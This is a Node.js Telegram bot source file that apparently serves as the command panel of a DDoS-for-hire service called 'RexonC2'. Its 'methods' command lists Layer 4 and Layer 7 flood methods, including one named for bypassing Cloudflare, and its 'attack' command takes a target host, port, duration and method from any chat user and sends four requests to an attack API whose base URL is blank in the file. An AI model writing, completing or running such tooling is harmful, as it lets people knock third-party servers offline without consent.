// Credit: Senz

const { fetchJson, range, parseMarkdown } = require('./lib/function')
const { Telegraf, Context } = require('telegraf')
const help = require('./lib/help')
const tele = require('./lib/tele')
const chalk = require('chalk')
const axios = require('axios');
const os = require('os')
const fs = require('fs')

const { apikey, bot_token, owner, ownerLink, version, prefix } = JSON.parse(fs.readFileSync(`./config.json`))

let entertainment = {}

if (bot_token == '') {
	return console.log('=== BOT TOKEN CANNOT BE EMPTY ===')
}

const bot = new Telegraf(bot_token)

bot.command('start', async (lol) => {
	user = tele.getUser(lol.message.from)
	await help.start(lol, user.full_name)
	await lol.deleteMessage()
})

bot.command('help', async (lol) => {
	user = tele.getUser(lol.message.from)
	await help.help(lol, user.full_name, lol.message.from.id.toString())
})

bot.on('callback_query', async (lol) => {
	cb_data = lol.callbackQuery.data.split('-')
	user_id = Number(cb_data[1])
	if (lol.callbackQuery.from.id != user_id) return lol.answerCbQuery('Sorry, You do not have the right to access this button.', { show_alert: true })
	callback_data = cb_data[0]
	user = tele.getUser(lol.callbackQuery.from)
	const isGroup = lol.chat.type.includes('group')
	const groupName = isGroup ? lol.chat.title : ''
	if (!isGroup) console.log(chalk.whiteBright('├'), chalk.cyanBright('[ ACTIONS ]'), chalk.whiteBright(callback_data), chalk.greenBright('from'), chalk.whiteBright(user.full_name))
	if (isGroup) console.log(chalk.whiteBright('├'), chalk.cyanBright('[ ACTIONS ]'), chalk.whiteBright(callback_data), chalk.greenBright('from'), chalk.whiteBright(user.full_name), chalk.greenBright('in'), chalk.whiteBright(groupName))
	if (callback_data == 'help') return await help[callback_data](lol, user.full_name, user_id)
	await help[callback_data](lol, user_id.toString())
})

bot.on('message', async (lol) => {
	try {
		const body = lol.message.text || lol.message.caption || ''
		comm = body.trim().split(' ').shift().toLowerCase()
		cmd = false
		if (prefix != '' && body.startsWith(prefix)) {
			cmd = true
			comm = body.slice(1).trim().split(' ').shift().toLowerCase()
		}
		const command = comm
		const args = await tele.getArgs(lol)
		const user = tele.getUser(lol.message.from)

		const reply = async (text) => {
			for (var x of range(0, text.length, 4096)) {
				return await lol.replyWithMarkdown(text.substr(x, 4096), { disable_web_page_preview: true })
			}
		}

		if (entertainment[lol.update.message.from.id] && entertainment[lol.update.message.from.id] === lol.update.message.text.toLowerCase()) {
			delete entertainment[lol.update.message.from.id]
			return reply('Jawaban Anda benar.')
		}

		const isCmd = cmd
		const isGroup = lol.chat.type.includes('group')
		const groupName = isGroup ? lol.chat.title : ''

		const isImage = lol.message.hasOwnProperty('photo')
		const isVideo = lol.message.hasOwnProperty('video')
		const isAudio = lol.message.hasOwnProperty('audio')
		const isSticker = lol.message.hasOwnProperty('sticker')
		const isContact = lol.message.hasOwnProperty('contact')
		const isLocation = lol.message.hasOwnProperty('location')
		const isDocument = lol.message.hasOwnProperty('document')
		const isAnimation = lol.message.hasOwnProperty('animation')
		const isMedia = isImage || isVideo || isAudio || isSticker || isContact || isLocation || isDocument || isAnimation

		const quotedMessage = lol.message.reply_to_message || {}
		const isQuotedImage = quotedMessage.hasOwnProperty('photo')
		const isQuotedVideo = quotedMessage.hasOwnProperty('video')
		const isQuotedAudio = quotedMessage.hasOwnProperty('audio')
		const isQuotedSticker = quotedMessage.hasOwnProperty('sticker')
		const isQuotedContact = quotedMessage.hasOwnProperty('contact')
		const isQuotedLocation = quotedMessage.hasOwnProperty('location')
		const isQuotedDocument = quotedMessage.hasOwnProperty('document')
		const isQuotedAnimation = quotedMessage.hasOwnProperty('animation')
		const isQuoted = lol.message.hasOwnProperty('reply_to_message')

		var typeMessage = body.substr(0, 50).replace(/\n/g, '')
		if (isImage) typeMessage = 'Image'
		else if (isVideo) typeMessage = 'Video'
		else if (isAudio) typeMessage = 'Audio'
		else if (isSticker) typeMessage = 'Sticker'
		else if (isContact) typeMessage = 'Contact'
		else if (isLocation) typeMessage = 'Location'
		else if (isDocument) typeMessage = 'Document'
		else if (isAnimation) typeMessage = 'Animation'

		if (!isGroup && !isCmd) console.log(chalk.whiteBright('├'), chalk.cyanBright('[ PRIVATE ]'), chalk.whiteBright(typeMessage), chalk.greenBright('from'), chalk.whiteBright(user.full_name))
		if (isGroup && !isCmd) console.log(chalk.whiteBright('├'), chalk.cyanBright('[  GROUP  ]'), chalk.whiteBright(typeMessage), chalk.greenBright('from'), chalk.whiteBright(user.full_name), chalk.greenBright('in'), chalk.whiteBright(groupName))
		if (!isGroup && isCmd) console.log(chalk.whiteBright('├'), chalk.cyanBright('[ COMMAND ]'), chalk.whiteBright(typeMessage), chalk.greenBright('from'), chalk.whiteBright(user.full_name))
		if (isGroup && isCmd) console.log(chalk.whiteBright('├'), chalk.cyanBright('[ COMMAND ]'), chalk.whiteBright(typeMessage), chalk.greenBright('from'), chalk.whiteBright(user.full_name), chalk.greenBright('in'), chalk.whiteBright(groupName))

		var file_id = ''
		if (isQuoted) {
			file_id = isQuotedImage
				? lol.message.reply_to_message.photo[lol.message.reply_to_message.photo.length - 1].file_id
				: isQuotedVideo
				? lol.message.reply_to_message.video.file_id
				: isQuotedAudio
				? lol.message.reply_to_message.audio.file_id
				: isQuotedDocument
				? lol.message.reply_to_message.document.file_id
				: isQuotedAnimation
				? lol.message.reply_to_message.animation.file_id
				: ''
		}
		var mediaLink = file_id != '' ? await tele.getLink(file_id) : ''

		switch (command) {
			case 'help':
				await help.help(lol, user.full_name, lol.message.from.id.toString())
				break

			case 'methods':
				await reply('RexonC2 Methods List\n\nLayer 4\n- OVH\n\nLayer 7\n- TLSv1\n- TLSv2\n- DCOUNT\n- CF-UAM\n- BRUTALITY')
				break

			case 'attack':
				if (args.length == 0) return await reply(`Example: /attack host port time methods`)
				if (args.length == 1) return await reply(`Example: /attack host port time methods`)
				if (args.length == 2) return await reply(`Example: /attack host port time methods`)
				if (args.length == 3) return await reply(`Example: /attack host port time methods`)
				axios.get(`&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
				axios.get(`&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
				axios.get(`&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
				axios.get(`&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
				await reply(`🚀 Attack Send Succesfully : ${args[0]}\nTime : ${args[2]}\nMethods : ${args[3]}`)
				break

			case 'test':
				test = await bot.telegram.getChatMembersCount(lol.message.chat.id)
				console.log(test)
				break
		}
	} catch (e) {
		console.log(chalk.whiteBright('├'), chalk.cyanBright('[  ERROR  ]'), chalk.redBright(e))
	}
})

bot.launch({
	dropPendingUpdates: true,
})
bot.telegram.getMe().then((getme) => {
	itsPrefix = prefix != '' ? prefix : 'No Prefix'
	console.log(chalk.greenBright(' ===================================================='))
	console.log(chalk.greenBright(' │ + Owner    : ' + owner || ''))
	console.log(chalk.greenBright(' │ + Bot Name : ' + getme.first_name || ''))
	console.log(chalk.greenBright(' │ + Version  : ' + version || ''))
	console.log(chalk.greenBright(' │ + Host     : ' + os.hostname() || ''))
	console.log(chalk.greenBright(' │ + Platfrom : ' + os.platform() || ''))
	console.log(chalk.greenBright(' │ + Prefix   : ' + itsPrefix))
	console.log(chalk.greenBright(' ===================================================='))
	console.log(chalk.whiteBright('╭─── [ LOG ]'))
})
process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))
